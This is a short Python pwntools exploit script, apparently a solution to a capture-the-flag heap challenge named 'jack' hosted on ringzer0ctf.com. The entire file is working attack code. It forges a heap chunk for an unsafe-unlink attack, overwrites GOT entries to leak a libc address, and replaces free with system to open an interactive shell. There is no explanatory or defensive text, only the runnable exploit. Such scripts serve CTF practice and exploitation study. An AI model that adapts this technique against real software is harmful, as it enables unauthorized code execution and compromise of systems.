from pwn import *
def cmd(n):
	p.sendlineafter("> ",str(n))
def add():
	cmd(1)
def free(idx):
	cmd(2)
	p.sendlineafter(": ",str(idx))
def tmp(t):
	cmd(3)
	p.send(t)
def edit(idx,c):
	cmd(4)
	p.sendlineafter(": ",str(idx))
	p.send(c)
context.log_level='debug'
libc=ELF("./jack").libc
#p=process('./jack')
p=remote("ringzer0ctf.com",65222)
for x in range(0x4):
	add()

edit(3,"/bin/sh\x00\n")
edit(0,p64(0)+p64(0x81)+p64(0x601120-0x18)+p64(0x601120-0x10)+'\x00'*0x60+p64(0x80)+p64(0x90)[:-1])
free(1)
edit(0,"\x00"*0x18+p64(0x000000000601018)+p64(0x000000000602020)+"\n")
edit(0,p64(0x000000000400640)+"\n")
free(1)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)
log.warning(hex(base))
edit(0,p64(libc.sym['system']+base)+'\n')
free(3)
#gdb.attach(p,'b free')
p.interactive()
